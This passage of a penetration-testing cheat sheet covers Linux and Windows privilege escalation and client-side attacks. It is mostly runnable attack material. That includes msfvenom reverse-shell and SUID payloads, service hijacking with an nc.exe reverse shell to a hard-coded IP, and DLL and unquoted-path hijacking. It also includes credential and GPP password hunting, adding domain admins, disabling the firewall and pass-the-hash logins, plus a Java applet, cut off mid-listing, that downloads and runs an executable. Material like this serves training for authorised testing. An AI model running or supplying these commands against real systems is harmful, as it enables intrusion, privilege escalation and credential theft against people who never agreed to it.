<li><a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</a></li>
<li><a href="https://payatu.com/guide-linux-privilege-escalation/">https://payatu.com/guide-linux-privilege-escalation/</a></li>
<li><a href="http://www.dankalia.com/tutor/01005/0100501004.htm">http://www.dankalia.com/tutor/01005/0100501004.htm</a>
<ul>
<li>Shell Escape Sequences
<ul>
<li><code>vi</code></li>
<li><code>emacs</code></li>
<li><code>find</code></li>
<li><code>awk</code></li>
<li><code>perl</code></li>
<li><code>man</code></li>
<li><code>nmap</code></li>
</ul>
</li>
<li>IFS Exploit</li>
<li>LD_PRELOAD Exploit</li>
<li>Abusing users with <code>.</code> in their PATH (requires interaction)</li>
<li>Symlinks (requires interaction)</li>
</ul>
</li>
<li><a href="https://www.pentestpartners.com/security-blog/exploiting-suid-executables/">https://www.pentestpartners.com/security-blog/exploiting-suid-executables/</a>
<ul>
<li>Simple PATH SUID Privilege Escalation</li>
</ul>
</li>
<li><a href="https://unix.stackexchange.com/questions/364/allow-setuid-on-shell-scripts?utm_medium=organic&amp;utm_source=google_rich_qa&amp;utm_campaign=google_rich_qa">https://unix.stackexchange.com/questions/364/allow-setuid-on-shell-scripts?utm_medium=organic&amp;utm_source=google_rich_qa&amp;utm_campaign=google_rich_qa</a>
<ul>
<li>SUID is ignored on all interpreted (shebang <code>#!</code>) executables</li>
</ul>
</li>
</ul>
<p>Tools:</p>
<ul>
<li><a href="https://github.com/sleventyeleven/linuxprivchecker">https://github.com/sleventyeleven/linuxprivchecker</a></li>
<li><a href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a></li>
</ul>
<h4 id="suid-privilege-escalation">SUID Privilege Escalation</h4>
<p>Note: <code>setuid</code> bit simply allows a script to set the <code>uid</code>. The script still needs to call <code>setuid()</code> or <code>setreuid()</code> to run in the the real uid or effective uid respectively. Without calling <code>setuid()</code> or <code>setreuid()</code>, the script will still run as the user who invoked the script: <a href="https://stackoverflow.com/a/20687988/4908573">https://stackoverflow.com/a/20687988/4908573</a></p>
<p>Ensure to use &ldquo;PrependSetuid=true&rdquo; when generating a binary that is going to be directly used in SUID privilege escalation:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">msfvenom -p linux/x86/exec cmd<span style="color:#f92672">=</span>/bin/bash PrependSetuid<span style="color:#f92672">=</span>true -f elf -o shell
</code></pre></div><p>Resources:</p>
<ul>
<li><a href="https://twitter.com/mubix/status/2049242113777664">https://twitter.com/mubix/status/2049242113777664</a></li>
<li><a href="http://linux4dummy.blogspot.sg/2012/05/creating-basic-backdoor-for-linux.html">http://linux4dummy.blogspot.sg/2012/05/creating-basic-backdoor-for-linux.html</a></li>
</ul>
<p>Or instead of using an &ldquo;exec&rdquo; binary to give you a shell, manually setuid in C, compile, run:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">echo -e <span style="color:#e6db74">&#39;#include &lt;stdio.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;unistd.h&gt;\n\nint main(void){\n\tsetuid(0);\n\tsetgid(0);\n\tsystem(&#34;/bin/bash&#34;);\n}&#39;</span> &gt; setuid.c
sudo chown root:root /tmp/setuid
sudo chmod <span style="color:#ae81ff">4755</span> /tmp/setuid
/tmp/setuid
</code></pre></div><h5 id="simple-path-suid-privilege-escalation">Simple PATH SUID Privilege Escalation</h5>
<pre><code># On Victim
bob@sufferance:~$ ls -l /usr/local/bin/uploadtosecure
-rwsr-xr-x 1 root root 6923 2008-10-07 19:38 /usr/local/bin/uploadtosecure
bob@sufferance:~$ strings /usr/local/bin/uploadtosecure
puts
system
...
Archiving files to secure server...
scp -r file/tobesecured/* 10.192.168.1.23:/var/www/html/files/

# On Kali
msfvenom -p linux/x86/exec CMD=/bin/sh -f elf -o scp

# On Victim
wget 192.168.1.23/scp -O /tmp/scp # transfer the exec binary over to Sufferance
chmod 755 /tmp/scp
export PATH=/tmp:$PATH
/usr/local/bin/uploadtosecure # it'll now call our &quot;special&quot; scp binary in /tmp instead
whoami
</code></pre><h5 id="bypass-absolute-binary-paths-with-ifs">Bypass Absolute Binary Paths with IFS</h5>
<p>If the binary being called is absolute (eg. <code>/usr/bin/scp</code>), you can export <code>IFS=/</code>. The SUID binary will now execute <code>usr bin scp</code>. Drop a <code>usr</code> binary into <code>/tmp</code> and add it to PATH.</p>
<h3 id="windows-configuration-issues">Windows Configuration Issues</h3>
<p>Great Resources:</p>
<ul>
<li><a href="https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html">https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html</a></li>
<li><a href="https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/">https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/</a></li>
<li>And more listed in the examples below</li>
</ul>
<h4 id="weak-service-permissions">Weak Service Permissions</h4>
<p>NOTE: Hi-priv shell sessions that are created through weak services will die quickly, like in 20-30 sec, make sure to migrate (Meterpreter) to a new process, or start a create a new process by opening another shell with nc.exe</p>
<h5 id="insecure-filefolder-permissions-with-wmic-and-icacls">Insecure File/Folder Permissions with <code>wmic</code> and <code>icacls</code></h5>
<p>Use <code>icacls [.exe]</code> to check for insecure permissions such as <code>Everyone:(I)(F)</code> within service executables (within <code>services.msc</code>), and then with a non-privileged user, replace that file with a malicious file.</p>
<p>Automatically find weak service file permissions with the following:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd"><span style="color:#66d9ef">for</span> <span style="color:#66d9ef">/f</span> <span style="color:#e6db74">&#34;tokens=2 delims=&#39;=&#39;&#34;</span> %a in (&#39;wmic service list full^|find /i &#34;pathname&#34;^|find /i /v &#34;system32&#34;&#39;) do @echo %a &gt;&gt; services.txt
for /f eol<span style="color:#ae81ff">^=^&#34;^ </span>delims<span style="color:#ae81ff">^=^&#34;</span> %a in (services.txt) do cmd.exe /c icacls &#34;%a<span style="color:#e6db74">&#34; &gt;&gt; permissions.txt</span>
# look for `Everyone:(...)(F)`, `BUILTIN\Users:(...)(F)`, `NT AUTHORITY\Authenticated Users:(...)(M)`, `NT AUTHORITY\Authenticated Users:(...)(C)`, `[Computer]\[Your User]:(...)(F)` in permissions.txt. transfer it out to kali if needed, as it it&#39;ll be easier to search
</code></pre></div><p>Upload a reverse shell executable and replace the original service executable with the malicious one with <code>copy useradd.exe C:\the\path\to\service\binary.exe</code>. The next time the service is started, the malicious executable will run with SYSTEM privileges.</p>
<p>Tools:</p>
<ul>
<li><code>icacls</code></li>
</ul>
<p>Alternatively, make the current low-priv user an Administrator. Prepare a malicious executable to give bob administrative rights on Kali:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
  <span style="color:#66d9ef">int</span> i;
  i <span style="color:#f92672">=</span> system(<span style="color:#e6db74">&#34;net localgroup administrators bob /add&#34;</span>);
  <span style="color:#66d9ef">return</span> i;
}
</code></pre></div><p>Compile it to an executable using mingw32: <code>i686-w64-mingw32-gcc -o useradd.exe useradd.c</code></p>
<p>Resources:</p>
<ul>
<li><a href="http://travisaltman.com/windows-privilege-escalation-via-weak-service-permissions/">http://travisaltman.com/windows-privilege-escalation-via-weak-service-permissions/</a></li>
<li><a href="https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/">https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/</a></li>
<li><a href="https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html">https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html</a></li>
</ul>
<h5 id="insecure-service-permissions-with-accesschkexe-and-sc">Insecure Service Permissions with <code>accesschk.exe</code> and <code>sc</code></h5>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd">accesschk.exe -accepteula
accesschk.exe -uwcqv <span style="color:#e6db74">&#34;Everyone&#34;</span> *
accesschk.exe -uwcqv <span style="color:#e6db74">&#34;Authenticated Users&#34;</span> *
accesschk.exe -uwcqv <span style="color:#e6db74">&#34;Users&#34;</span> *
# find a service that returns `SERVICE_ALL_ACCESS`.
sc qc Apache # query the service to check whether it runs as system, it&#39;s binary path, etc.
sc config Apache binPath= <span style="color:#e6db74">&#34;C:\Windows\TEMP\nc.exe 192.168.1.23 4444 -e cmd.exe&#34;</span> # or <span style="color:#e6db74">&#34;net localgroup administrators bob /add&#34;</span>
sc config Apache obj= <span style="color:#e6db74">&#34;.\LocalSystem&#34;</span> password= <span style="color:#e6db74">&#34;&#34;</span> # this makes the service run as SYSTEM. do this for services that has smth other than LocalSystem in SERVICE_START_NAME
sc config Apache start= demand # this allows a service to be started. do this if a service is disabled
# restart service
</code></pre></div><p>Windows XP SP0 &amp; SP1 UPNP (upnphost) and SSDP Discovery (ssdpsrv) Services have insecure service permission. They allow &ldquo;Authenticated Users&rdquo; to modify the services. It can be used as a universal local privilege escalation vulnerability. Note, upnphost requires ssdpsrv to start first.</p>
<p>Tools:</p>
<ul>
<li><code>accesschk.exe</code></li>
<li><code>sc</code></li>
<li>Metasploit Module: <code>exploit/windows/local/service_permissions</code></li>
</ul>
<p>Resources:</p>
<ul>
<li><a href="http://www.fuzzysecurity.com/tutorials/16.html">http://www.fuzzysecurity.com/tutorials/16.html</a></li>
<li><a href="https://pentestlab.blog/2017/03/30/weak-service-permissions/">https://pentestlab.blog/2017/03/30/weak-service-permissions/</a></li>
<li><a href="https://www.sploitspren.com/2018-01-26-Windows-Privilege-Escalation-Guide/">https://www.sploitspren.com/2018-01-26-Windows-Privilege-Escalation-Guide/</a></li>
<li>Enable a disabled service with sc, other options here as well: <a href="http://www.itprotoday.com/management-mobility/how-can-i-configure-services-start-type-command-line">http://www.itprotoday.com/management-mobility/how-can-i-configure-services-start-type-command-line</a></li>
<li>UPNP (upnphost) requires SSDP Discovery (ssdpsrv) to start: <a href="https://www.pcreview.co.uk/threads/upnp-service-not-starting.2694748/">https://www.pcreview.co.uk/threads/upnp-service-not-starting.2694748/</a></li>
<li>SSDP Discovery service name is ssdpsrv: <a href="https://computerstepbystep.com/ssdp_discovery_service.html">https://computerstepbystep.com/ssdp_discovery_service.html</a></li>
</ul>
<h5 id="unquoted-services">Unquoted Services</h5>
<p>Find services that are unquoted:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd">wmic service get name,displayname,pathname,startmode |findstr /i <span style="color:#e6db74">&#34;Auto&#34;</span> |findstr /i /v <span style="color:#e6db74">&#34;C:\Windows\\&#34;</span> |findstr /i /v <span style="color:#e6db74">&#34;&#34;&#34;</span>
</code></pre></div><p>When Windows attempts to run these services, it will look at the following paths in order and run the first executable that it finds. Just imagine splitting the string with a space:</p>
<pre><code># C:\Program Files (x86)\Program Folder\A Subfolder\Another Subfolder\Executable.exe
C:\Program.exe
C:\Program Files.exe
C:\Program Files (x86)\Program.exe
C:\Program Files (x86)\Program Folder\A.exe
C:\Program Files (x86)\Program Folder\A Subfolder\Another.exe
C:\Program Files (x86)\Program Folder\A Subfolder\Another Subfolder\Executable.exe
</code></pre><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd">icacls <span style="color:#e6db74">&#34;C:\Program Files (x86)\Program Folder\A Subfolder&#34;</span>
# look for `Everyone:(...)(F)`, `BUILTIN\Users:(...)(F)`, `NT AUTHORITY\Authenticated Users:(...)(M)`, `NT AUTHORITY\Authenticated Users:(...)(C)`, or `[Computer]\[Your User]:(...)(F)` to check if you are able to write that directory
# drop a malicious executable at <span style="color:#e6db74">&#34;C:\Program Files (x86)\Program Folder\A Subfolder\Another.exe&#34;</span> that spawns a shell
# restart service
</code></pre></div><p>Tools:</p>
<ul>
<li><code>wmic service</code></li>
<li><code>icacls</code></li>
<li>Metasploit Module: <code>exploit/windows/local/trusted_service_path</code></li>
</ul>
<p>Reference:</p>
<ul>
<li><a href="https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/">https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/</a></li>
<li><a href="https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html">https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html</a></li>
</ul>
<h4 id="alwaysinstallelevated">AlwaysInstallElevated</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd"># On Windows:
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# if key is found, the following is produced:
# HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
#    AlwaysInstallElevated    REG_DWORD    0x1
# if not found:
# ERROR: The system was unable to find the specified registry key or value.

# On Kali, generate a msi that will call a reverse shell
msfvenom -p windows/shell_reverse_tcp -e x86/shikata_ga_nai LHOST=[kali ip] LPORT=[port] -f exe -o payload.exe
msfvenom -p windows/exec cmd=<span style="color:#e6db74">&#34;C:\Users\bob\AppData\Local\Temp\Payload.exe&#34;</span> -f msi-nouac -o shell.msi
# transfer both to <span style="color:#e6db74">&#34;C:\Users\bob\AppData\Local\Temp\&#34;</span>

# On Windows:
msiexec /quiet /qn /i <span style="color:#e6db74">&#34;C:\Users\bob\AppData\Local\Temp\malicious.msi&#34;</span> # /quiet - Suppress messages to the user, /qn - no gui, /i - regular (vs administrative) installation
</code></pre></div><p>Tools:</p>
<ul>
<li>Metasploit Module: <code>exploit/windows/local/always_install_elevated</code></li>
</ul>
<p>Resources:</p>
<ul>
<li><a href="https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/">https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/</a></li>
<li><a href="https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html">https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html</a></li>
</ul>
<h4 id="dll-hijacking">DLL Hijacking</h4>
<p>Order in which Windows finds a DLL:</p>
<ol>
<li>The directory from which the application loaded</li>
<li>32-bit System directory (C:\Windows\System32)</li>
<li>16-bit System directory (C:\Windows\System)</li>
<li>Windows directory (C:\Windows)</li>
<li>The current working directory (CWD)</li>
<li>Directories in the PATH environment variable (system then user)</li>
</ol>
<p>Sometimes, a DLL does not exist on the machine. As a low privilege user we have little hope of putting a malicious DLL in 1-4, 5 is not a possibility in this case because we are talking about a Windows service but if we have write access to any of the directories in the Windows PATH we win.</p>
<p>We&rsquo;ll need 2 things, a writable file/folder in %PATH% (&ldquo;C:\Python27&rdquo;), and a vulnerable service/application that has missing DLLs (IKEEXT):</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd"><span style="color:#66d9ef">echo</span> %path%
# Find a non-default directory in <span style="color:#e6db74">&#34;C:\&#34;</span>, it will give write access to authenticated users.
cacls <span style="color:#e6db74">&#34;C:\Python27&#34;</span>
msfvenom -p windows/shell_reverse_tcp lhost=[kali ip] lport=[port] -f dll -o shell.dll # on Kali
<span style="color:#66d9ef">copy</span> shell.dll C:\Python27\wlbsctrl.dll
# restart IKEEXT service
</code></pre></div><p>Resources:</p>
<ul>
<li><a href="http://www.fuzzysecurity.com/tutorials/16.html">http://www.fuzzysecurity.com/tutorials/16.html</a></li>
<li><a href="https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/">https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/</a></li>
<li>ExploitDB: <a href="https://www.exploit-db.com/dll-hijacking-vulnerable-applications/">https://www.exploit-db.com/dll-hijacking-vulnerable-applications/</a></li>
<li><code>searchsploit [program] dll</code>. Find ones that has &ldquo;DLL Hijacking&rdquo; in the name</li>
</ul>
<h4 id="task-scheduler-weak-filefolder-permissions">Task Scheduler Weak File/Folder Permissions</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd">schtasks /query /fo LIST /v
# Look at the <span style="color:#e6db74">&#34;Task To Run&#34;</span> within the task list. Eg: E:\GrabLogs\tftp.exe 10.1.1.99 GET ...
cacls <span style="color:#e6db74">&#34;E:\GrabLogs&#34;</span>
# If Authenticated Users or Users or equivalent has modify permissions, simply replace the binary within with a reverse shell
<span style="color:#66d9ef">copy</span> shell.exe E:\GrabLogs\tftp.exe
</code></pre></div><h4 id="stored-credentials">Stored Credentials</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd"><span style="color:#66d9ef">dir</span> c:\*pass*.txt /s /b
<span style="color:#66d9ef">dir</span> c:\*vnc.ini /s /b /c
<span style="color:#66d9ef">dir</span> c:\*ultravnc.ini /s /b /c
<span style="color:#66d9ef">dir</span> c:\ /s /b /c | findstr /si *vnc.ini
findstr /si password *.txt | *.xml | *.ini
findstr /si pass *.txt | *.xml | *.ini
<span style="color:#66d9ef">type</span> C:\unattend.xml
<span style="color:#66d9ef">type</span> C:\sysprep.inf
<span style="color:#66d9ef">type</span> C:\sysprep\sysprep.xml
</code></pre></div><p>Retrieving credentials stored within GPP files from Domain Controller:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd">net use z: \\dc01\SYSVOL # whr dc01 is the Domain Controller
<span style="color:#66d9ef">cd</span> C:\Windows\SYSVOL # or cd in, if you are the Domain Controller already
<span style="color:#66d9ef">dir</span> /s Groups.xml
findstr -si cpassword C:\..\Groups.xml
# within Groups.xml file, find <span style="color:#e6db74">&#34;cpassword&#34;</span>, then gpp-decrypt them on kali
</code></pre></div><h4 id="administrator-to-system-not-required-not-an-issue">Administrator to SYSTEM (Not Required) (Not an Issue)</h4>
<h5 id="task-scheduler">Task Scheduler</h5>
<p>This method only works on a Windows 2000, XP, or 2003 machine. And this requires local administrator access. Creates a high-priv shell using task scheduler.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd"><span style="color:#66d9ef">time</span>
# set the following to 1min after current time
at 01:23 /interactive <span style="color:#e6db74">&#34;C:\shell.exe&#34;</span> # to open reverse shell
at 01:23 /interactive cmd.exe # to open cmd with System privileges, only works when you have GUI
</code></pre></div><p>Resources:</p>
<ul>
<li><a href="https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/">https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/</a></li>
</ul>
<h6 id="reconfigure-a-service">Reconfigure a Service</h6>
<p>Refer to Insecure Service Permissions.</p>
<h4 id="useful-cmd-commands">Useful Cmd Commands</h4>
<p>Restarting a Windows service methods:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd">sc query Apache # check service status

sc stop Apache &amp;&amp; sc start Apache
net stop Apache &amp;&amp; net start Apache
wmic service Apache call startservice
shutdown /r /t 0 # last resort, reboot, or just wait for user to reboot
</code></pre></div><p>Preparation of adding a non-privileged user and allowing remote desktop connection:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd">net user bob bob /add
net localgroup <span style="color:#e6db74">&#34;Remote Desktop Users&#34;</span> bob /add
# runas /user:bob cmd.exe # to use a shell instead of remote connection
</code></pre></div><p>Adding user to local administrators group:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd">net localgroup administrators bob /add
</code></pre></div><p>Creating a Domain Admin user and login to other servers within the domain. By default, Domain Admins group is part of every server&rsquo;s local Administrator group within the domain.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd">net user testing 1qwer$#@! /add /domain
net group <span style="color:#e6db74">&#34;Domain Admins&#34;</span> testing /add /domain
# rdesktop -u &#39;[domain]\testing&#39; -p &#39;1qwer$#@!&#39; [ip of server part of domain] # on kali
# Start &gt; Right-Click Command Prompt &gt; Run as Administrator # Even as a domain admin, you&#39;ll have to manually open cmd as admin because of UAC. (https://blogs.msdn.microsoft.com/patricka/2010/05/13/if-im-an-administrator-why-do-i-get-access-denied/)
</code></pre></div><p>Connecting using RDP (TCP Port 3389) on Kali. Do note, if password is wrong, <code>xfreerdp</code> will return error code <code>0x20009</code>, note if password is correct however server disables local logins, <code>xfreerdp</code> will open the session, but within the session, it&rsquo;ll say &ldquo;The user name or password is incorrect&rdquo;. Meaning that your passwords may be correct, even if RDP isn&rsquo;t allowed.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">rdesktop -u Administrator -p abc123 192.168.1.23
rdesktop -u <span style="color:#e6db74">&#39;thinc\testing&#39;</span> -p <span style="color:#e6db74">&#39;1qwer$#@!&#39;</span> 192.168.1.23 <span style="color:#75715e"># where thinc is the domain. if thinc doesn&#39;t work, try thinc.local</span>
xfreerdp /u:testing /d:thinc /p:<span style="color:#e6db74">&#39;1qwer$#@!&#39;</span> /v:192.168.1.23
xfreerdp /u:testing /d:thinc /pth:31d6cfe0d16ae931b73c59d7e0c089c0 /v:192.168.1.23 <span style="color:#75715e"># PTH method</span>
</code></pre></div><p>Checking firewall rules:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd"># Deprecated firewall command
netsh firewall set opmode mode=disable exceptions=disable # disable firewall, requires priv

# Newer advfirewall
netsh advfirewall set currentprofile state off # disable firewall, requires priv
netsh advfirewall firewall show rule name=all | find <span style="color:#e6db74">&#34;Rule Name:&#34;</span> | find <span style="color:#e6db74">&#34;NameLookingFor&#34;</span> # search for a rule
</code></pre></div><p>Finding a file</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd"><span style="color:#66d9ef">dir</span> /s proof.txt # /s recursive
<span style="color:#66d9ef">dir</span> /s /a proof.txt # /s recursive, /a attributes (show all hidden and system files as well)
</code></pre></div><p>Finding strings</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd">findstr /i <span style="color:#e6db74">&#34;hello&#34;</span> filename # /i for ignore case
findstr /si <span style="color:#e6db74">&#34;hello&#34;</span> # /i for ignore case, /s for recursive
</code></pre></div><p>Opening a file in notepad (requires GUI):</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd"><span style="color:#66d9ef">start</span> notepad filename
</code></pre></div><p>Shortnames when changing directories or during directory path traversal:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd"># C:\Program Files\A Pro Gram\
# 6 first chars + ~1
<span style="color:#66d9ef">cd</span> C:\PROGRA~1\APROGR~1\
</code></pre></div><p>Finding Windows version with only hard drive access:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd"><span style="color:#66d9ef">type</span> C:\Windows\System32\eula.txt
</code></pre></div><h1 id="client-side-attacks">Client Side Attacks</h1>
<h2 id="know-your-target">Know Your Target</h2>
<h3 id="passive-client-information-gathering">Passive Client Information Gathering</h3>
<p>Find information online about the target, such as browser version from websites that collect user agent data.</p>
<h3 id="active-client-information-gathering">Active Client Information Gathering</h3>
<p>Social engineering, calling the company as a support technician in an attempt to extract useful information from the person on the other side of the line. Or sending them an email, with hope for a response or a link click, that would enumerate the user&rsquo;s browser version and installed extensions.</p>
<h2 id="ms12-037---internet-explorer-8-fixed-col-span-id">MS12-037 - Internet Explorer 8 Fixed Col Span ID</h2>
<p><a href="https://www.exploit-db.com/exploits/24017/">https://www.exploit-db.com/exploits/24017/</a></p>
<p>Host the malicious page and visit it. Bind shell open on port 4444.</p>
<p>To swap out shellcode, ensure the new shellcode is of the same size as the exploit apparently bypasses ASLR and DEP, and it also mentions it will be more reliable if it was the same size.</p>
<p>For that, generate the following Windows reverse shell, in Javascript unicode format, with no encoding:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">msfvenom -p windows/shell_reverse_tcp LHOST<span style="color:#f92672">=[</span>kali ip<span style="color:#f92672">]</span> LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">443</span> -f js_le -e generic/none
</code></pre></div><p>Since the payload is 18 bytes smaller, pad it with 18 NOPs: <code>%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090</code></p>
<h2 id="java-signed-applet-attack">Java Signed Applet Attack</h2>
<p>Java.java</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#f92672">import</span> java.applet.*<span style="color:#f92672">;</span>
<span style="color:#f92672">import</span> java.awt.*<span style="color:#f92672">;</span>
<span style="color:#f92672">import</span> java.io.*<span style="color:#f92672">;</span>
<span style="color:#f92672">import</span> java.net.URL<span style="color:#f92672">;</span>
<span style="color:#f92672">import</span> java.util.*<span style="color:#f92672">;</span>

<span style="color:#75715e">/**
</span><span style="color:#75715e"> * Author: Offensive Security
</span><span style="color:#75715e"> * This Java applet will download a file and execute it.
</span><span style="color:#75715e"> **/</span>

<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Java</span> <span style="color:#66d9ef">extends</span> Applet <span style="color:#f92672">{</span>
    <span style="color:#66d9ef">private</span> Object initialized <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">;</span>
    <span style="color:#66d9ef">public</span> Object <span style="color:#a6e22e">isInitialized</span><span style="color:#f92672">()</span>
    <span style="color:#f92672">{</span>
        <span style="color:#66d9ef">return</span> initialized<span style="color:#f92672">;</span>
    <span style="color:#f92672">}</span>
    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">init</span><span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
        Process f<span style="color:#f92672">;</span>
        <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
            String tmpdir <span style="color:#f92672">=</span> System<span style="color:#f92672">.</span><span style="color:#a6e22e">getProperty</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;java.io.tmpdir&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">+</span> File<span style="color:#f92672">.</span><span style="color:#a6e22e">separator</span><span style="color:#f92672">;</span>
            String expath <span style="color:#f92672">=</span> tmpdir <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;evil.exe&#34;</span><span style="color:#f92672">;</span>
            String download <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">;</span>
            download <span style="color:#f92672">=</span> getParameter<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;1&#34;</span><span style="color:#f92672">);</span>
            <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>download<span style="color:#f92672">.</span><span style="color:#a6e22e">length</span><span style="color:#f92672">()</span> <span style="color:#f92672">&gt;</span> 0<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
                <span style="color:#75715e">// URL parameter
</span><span style="color:#75715e"></span>                URL url <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> URL<span style="color:#f92672">(</span>download<span style="color:#f92672">);</span>
                <span style="color:#75715e">// Get an input stream for reading
</span><span style="color:#75715e"></span>                InputStream in <span style="color:#f92672">=</span> url<span style="color:#f92672">.</span><span style="color:#a6e22e">openStream</span><span style="color:#f92672">();</span>
                <span style="color:#75715e">// Create a buffered input stream for efficency
</span><span style="color:#75715e"></span>                BufferedInputStream bufIn <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> BufferedInputStream<span style="color:#f92672">(</span>in<span style="color:#f92672">);</span>
                File outputFile <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> File<span style="color:#f92672">(</span>expath<span style="color:#f92672">);</span>
